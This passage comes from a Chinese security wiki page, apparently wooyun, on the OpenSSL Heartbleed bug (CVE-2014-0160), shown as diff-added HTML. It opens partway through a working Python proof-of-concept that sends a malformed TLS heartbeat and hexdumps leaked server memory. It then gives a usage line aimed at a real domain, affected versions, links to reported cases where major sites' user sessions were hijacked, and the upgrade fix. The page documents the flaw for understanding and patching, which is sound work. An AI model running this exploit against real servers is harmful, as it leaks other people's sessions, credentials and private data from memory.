+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'No heartbeat response received, server likely not vulnerable'</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">False</span>
+ 
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> typ <span style="box-sizing:border-box;color:rgb(102, 204, 102);">==</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">24</span>:
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Received heartbeat response:'</span>
+            hexdump<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>pay<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">len</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>pay<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">3</span>:
+                <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'WARNING: server returned more data than it should - server is vulnerable!'</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">else</span>:
+                <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Server processed malformed heartbeat, but did not return any extra data.'</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">True</span>
+ 
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> typ <span style="box-sizing:border-box;color:rgb(102, 204, 102);">==</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">21</span>:
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Received alert:'</span>
+            hexdump<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>pay<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Server returned error, likely not vulnerable'</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">False</span>
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">def</span> main<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>:
+    opts<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> args <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> options.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">parse_args</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">len</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>args<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&lt;</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">1</span>:
+        options.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">print_help</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span>
+ 
+    s <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">socket</span>.<span style="box-sizing:border-box;color:rgb(0, 0, 102);">socket</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(0, 0, 102);">socket</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">AF_INET</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">socket</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">SOCK_STREAM</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Connecting...'</span>
+    <span style="box-sizing:border-box;color:rgb(0, 0, 102);">sys</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">stdout</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">flush</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    s.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">connect</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>args<span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span><span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> opts.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">port</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Sending Client Hello...'</span>
+    <span style="box-sizing:border-box;color:rgb(0, 0, 102);">sys</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">stdout</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">flush</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    s.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">send</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>hello<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Waiting for Server Hello...'</span>
+    <span style="box-sizing:border-box;color:rgb(0, 0, 102);">sys</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">stdout</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">flush</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">while</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">True</span>:
+        typ<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> ver<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> pay <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> recvmsg<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> typ <span style="box-sizing:border-box;color:rgb(102, 204, 102);">==</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>:
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Server closed connection without sending Server Hello.'</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span>
+        <span style="box-sizing:border-box;color:rgb(128, 128, 128);font-style:italic;"># Look for server hello done message.</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> typ <span style="box-sizing:border-box;color:rgb(102, 204, 102);">==</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">22</span> <span style="box-sizing:border-box;color:rgb(177, 177, 0);">and</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">ord</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>pay<span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span><span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">==</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">0x0E</span>:
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">break</span>
+ 
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Sending heartbeat request...'</span>
+    <span style="box-sizing:border-box;color:rgb(0, 0, 102);">sys</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">stdout</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">flush</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    s.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">send</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>hb<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    hit_hb<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> __name__ <span style="box-sizing:border-box;color:rgb(102, 204, 102);">==</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'__main__'</span>:
+    main<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+使用方法
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">py www.wooyun.org <span style="box-sizing:border-box;color:rgb(102, 0, 51);">--port</span>=<span style="box-sizing:border-box;color:rgb(204, 102, 204);">443</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+网站若存在漏洞将返回服务器中的内存数据。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">4、影响范围</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+使用了以下版本的 OpenSSL的服务器。
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等</pre>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">5、实际案例</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307183759/http://www.wooyun.org/bugs/wooyun-2010-055932" title="http://www.wooyun.org/bugs/wooyun-2010-055932" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">淘宝主站运维不当导致可以登录随机用户并且获取服务器敏感信息</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307183759/http://www.wooyun.org/bugs/wooyun-2010-055941" title="http://www.wooyun.org/bugs/wooyun-2010-055941" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">微信网页版和公众账号版运维不当导致可随机登录微信用户并获取服务器敏感信息</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307183759/http://www.wooyun.org/bugs/wooyun-2010-056253" title="http://www.wooyun.org/bugs/wooyun-2010-056253" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">京东某分站openssl漏洞导致敏感信息泄露及全站随机用户登录(证明可登录)</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307183759/http://www.wooyun.org/bugs/wooyun-2010-055942" title="http://www.wooyun.org/bugs/wooyun-2010-055942" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">雅虎主站运维不当导致可以登录随机用户并且获取服务器敏感信息</a>
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">6、漏洞修复</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+升级OpenSSL到版本1.0.1g及以上。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">7、相关资源</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307183759/https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160" title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">CVE-2014-0160</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160307183759/https://gist.github.com/RixTox/10222402" title="https://gist.github.com/RixTox/10222402" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">openssl poc</a>
+</p>
+
+</div>
+
+              
+
+                            
+            <span style="display:table;clear:both;"/></div></div></div></span></div></div></div></div></div><br/></div></body></html>
